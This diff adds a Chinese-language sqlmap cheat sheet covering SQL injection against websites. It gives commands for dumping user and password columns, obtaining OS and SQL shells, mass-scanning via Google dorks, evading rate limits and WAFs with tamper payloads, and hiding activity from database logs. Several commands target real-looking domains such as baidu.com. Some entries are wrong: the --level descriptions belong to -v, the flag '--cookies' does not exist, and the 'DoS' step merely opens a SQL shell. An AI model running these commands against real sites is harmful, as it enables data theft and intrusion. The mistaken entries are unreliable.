@@ -1,0 +1,317 @@
+							sqlmap
+						
+					
+
+1.简介
+
+	sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞。	
+		
+	sqlmap支持的数据库有
+
+		MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, 
+		
+		IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
+
+
+2.命令
+
+	-u URL 						#指定注入地址
+	-m url.txt 					#从文本中写入注入地址
+	-v VERBOSE 					#详细级别：0-6（默认为1）
+	–-level=LEVEL 				#执行测试的等级（0-6，默认为1）
+									0、只显示python错误以及严重的信息。
+									1、同时显示基本信息和警告信息。（默认）
+									2、同时显示debug信息。
+									3、同时显示注入的payload。
+									4、同时显示HTTP请求。
+									5、同时显示HTTP响应头。
+									6、同时显示HTTP响应页面。
+	–-batch 					#从不询问用户输入，使用所有默认配置
+
+	-r REQUESTFILE 				#从一个文件中载入HTTP请求。
+	-p	PARA					#指定注入用的参数
+	–-data  "DATA"         		#通过POST发送的数据字符串
+	–-cookie "COOKIE"     		#HTTP Cookie头
+	–-cookie-urlencode  "URL"	#URL编码生成的cookie注入
+	–-forms 					#对目标URL的解析和测试形式
+	
+	–-dbs 						#所有数据库
+	–-current-db 				#网站当前数据库
+	-–tables 					#枚举的DBMS数据库中的表
+	-–columns 					#枚举DBMS数据库表列
+	–-dump 						#转储数据库管理系统的数据库中的表项
+	-D DBname 					#要进行枚举的指定数据库名
+	-T TBLname 					#要进行枚举的指定数据库表	
+	-C COL 						#要进行枚举的数据库列
+	
+	
+	-–is-dba 					#当前用户权限（是否为root权限）
+	-–users 					#所有数据库用户
+	-–current-user 				#当前数据库用户
+	–-passwords 				#数据库密码
+	
+	
+	–-os-cmd=COMMAND 			#执行操作系统命令
+	–-sql-shell 				#获取交互式SQL的shell
+	
+	–-delay DELAY 				#在每个HTTP请求之间的延迟时间，单位为秒
+	–safe-freq	SAFREQ 			#两次访问之间测试请求，给出安全的URL
+	
+	–-tamper "TAMPER.py" 		#使用给定的脚本（S）篡改注入数据
+
+
+	
+3.常用场景
+
+
+	(1)基本注入(Get注入)
+	
+	sqlmap -u http://www.vuln.cn/post.php?id=1   --dbs  				   #获取数据库
+	
+	sqlmap -u http://www.vuln.cn/post.php?id=1   -D databaseName --tables  #获取指定数据库的表
+	
+	sqlmap -u http://www.vuln.cn/post.php?id=1   -D databaseName -T tableName --columns 
+	
+														#获取指定数据库指定表的字段及其类型
+	
+	sqlmap -u http://www.vuln.cn/post.php?id=1   -D databaseName -T tableName -C user,password --dump
+														
+														#获取指定数据库指定表指定字段的值
+	
+	
+	
+	
+	(2)cookies注入：当程序有防get注入的时候，可以使用cookie注入(只有level达到2才会检测cookie)
+	
+	
+	sqlmap -u http://www.baidu.com/shownews.asp   --cookies  "id=9" --tables --level 2 				
+	
+	sqlmap -u http://www.baidu.com/shownews.asp   --cookies  "id=9" -T tableName --columns --level 2 
+	
+	sqlmap -u http://www.baidu.com/shownews.asp   --cookies  "id=9" -T tableName -C user,password --dump --level 2 
+	
+
+	
+	(3)post注入
+	
+	a.可以使用burpsuite工具来抓取post包
+		
+		request.txt：包含整个表单post提交内容
+	
+	sqlmap -r request.txt -p tfUName 			
+	
+	b.直接用data属性注入
+	
+	sqlmap -u http://testasp.vulnweb.com/Login.asp --data "tfUName=1&tfUPass=1"
+	
+	c.自动注入
+	
+	sqlmap -u http://xxxx.xxxx.com/Login.asp –-forms
+	
+	
+	
+	(3)交互式写shell
+	
+		sqlmap -u https://  --os-cmd=ifconfig
+		sqlmap -u https://  --os-shell 				#交互式写shell
+			a.选择上传的shell脚本类型
+			b.网站根目录在服务器的绝对位置
+			c.上传的shell目录（默认根目录）
+	
+	
+	(4)请求延时
+		
+		在注入过程中请求太频繁的话可能会被防火墙拦截，这时候--delay参数就起作用了。可以设定两次
+		
+		HTTP请求间的延时。有的web程序会在多次错误访问后屏蔽所有请求，这样就导致之后所有的测试无
+		
+		法进行，绕过这个策略可以使用--safe-url，每隔一段时间去访问一个正常的页面。
+	
+		sqlmap -u https://  --delay 3
+		sqlmap -u https://  --safe-freq 3
+	
+	
+	
+	
+	(5)Google批量检测注入:
+
+		sqlmap  -g inurl:php?id=1
+
+	
+	
+	
+	(6)Mysql DOS攻击:导致对方mysql关闭
+
+		sqlmap -u https://  --sql-shell
+	
+	
+	
+	
+	(7)绕过WAF（网站应用级入侵防御系统）防火墙(sqlmap的tamper目录下有很多编码脚本)
+	
+	
+	sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs  --batch --tamper "space2morehash.py"
+
+	
+	apostrophemask.py UTF-8编码 
+		Example: 
+			* Input: AND '1'='1' 
+			* Output: AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87 
+
+	
+	apostrophenullencode.py unicode编码 
+		Example: 
+			* Input: AND '1'='1' 
+			* Output: AND %00%271%00%27=%00%271%00%27 
+
+	appendnullbyte.py 添加%00 
+		Example: 
+			* Input: AND 1=1 
+			* Output: AND 1=1%00 
+		Requirement: 
+			* Microsoft Access 
+
+	base64encode.py base64编码 
+		Example: 
+			* Input: 1' AND SLEEP(5)# 
+			* Output: MScgQU5EIFNMRUVQKDUpIw== 
+
+	between.py 以”not between”替换”>“ 
+		Example: 
+			* Input: 'A > B' 
+			* Output: 'A NOT BETWEEN 0 AND B' 
+
+	bluecoat.py 以随机的空白字符替代空格，以”like”替代”=“ 
+		Example: 
+			* Input: SELECT id FROM users where id = 1 
+			* Output: SELECT%09id FROM users where id LIKE 1 
+		Requirement: 
+			* MySQL 5.1, SGOS 
+
+	chardoubleencode.py 双重url编码 
+		Example: 
+			* Input: SELECT FIELD FROM%20TABLE 
+			* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545
+
+	charencode.py url编码 
+		Example: 
+			* Input: SELECT FIELD FROM%20TABLE 
+			* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45
+
+	charunicodeencode.py 对未进行url编码的字符进行unicode编码 
+		Example: 
+			* Input: SELECT FIELD%20FROM TABLE 
+			* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045'
+		Requirement: 
+			* ASP 
+			* ASP.NET 
+
+	equaltolike.py 以”like”替代”=“ 
+		Example: 
+			* Input: SELECT * FROM users WHERE id=1 
+			* Output: SELECT * FROM users WHERE id LIKE 1 
+
+	halfversionedmorekeywords.py在每个关键字前添加条件注释 
+		Example: 
+			* Input: value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa 
+			* Output: value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND 'QDWa'='QDWa 
+		Requirement: 
+			* MySQL < 5.1 
+
+	ifnull2ifisnull.py 以”IF(ISNULL(A), B, A)”替换”IFNULL(A, B)” 
+		Example: 
+			* Input: IFNULL(1, 2) 
+			* Output: IF(ISNULL(1), 2, 1) 
+		Requirement: 
+			* MySQL 
+			* SQLite (possibly) 
+			* SAP MaxDB (possibly) 
+
+	modsecurityversioned.py 条件注释 
+		Example: 
+			* Input: 1 AND 2>1-- 
+			* Output: 1 /*!30000AND 2>1*/-- 
+		Requirement: 
+			* MySQL 
+
+	multiplespaces.py 添加多个空格 
+		Example: 
+			* Input: UNION SELECT 
+			* Output:  UNION   SELECT 
+
+	percentage.py 在每个字符前添加百分号（%） 
+		Example: 
+			* Input: SELECT FIELD FROM TABLE 
+			* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E 
+		Requirement: 
+			* ASP 
+
+	randomcase.py 随机大小写 
+		Example: 
+			* Input: INSERT 
+			* Output: InsERt 
+
+
+	sp_password.py 语句结尾添加”sp_password”迷惑数据库日志
+		Example: www.2cto.com 
+			* Input: 1 AND 9227=9227-- 
+			* Output: 1 AND 9227=9227--sp_password 
+		Requirement: 
+			* MSSQL 
+
+	space2hash.py 以单行注释”#”和由随机字符组成的新行替换空格 
+		Example: 
+			* Input: 1 AND 9227=9227 
+			* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227 
+		Requirement: 
+			* MySQL 
+
+	unmagicquotes.py 以”%bf%27”替换单引号，并在结尾添加注释”--” 
+		Example: 
+			* Input: 1' AND 1=1 
+			* Output: 1%bf%27 AND 1=1--%20 
+
+	versionedkeywords.py 对不是函数的关键字条件注释 
+		Example: 
+			* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# 
+			* Output:  1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#
+		Requirement: 
+			* MySQL 
+
+	versionedmorekeywords.py 对关键字条件注释 
+		Example: 
+			* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 
+			* Output: 1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#
+		Requirement: 
+			* MySQL >= 5.1.13
+	
+
+	
+	
+	(8)伪静态注入:使用“*”符号来自定义注射位置
+		
+		有些web服务器进行了url rewrite或者网站是伪静态的，无法直接提供测试参数，这样子可以使用*
+	
+	来代替要测试的参数。
+	
+		sqlmap -u "http://www.code521.com/123/456*/789" -v 4 
+
+		
+	(9)其它操作
+	
+		#读取数据库版本，当前用户，当前数据库 
+ 
+	sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
+ 
+		#判断当前数据库用户权限 
+ 
+	sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
+ 
+	sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
+ 
+		#读取所有数据库用户或指定数据库用户的密码 
+ 
+	sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
+ 
+	sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
+	
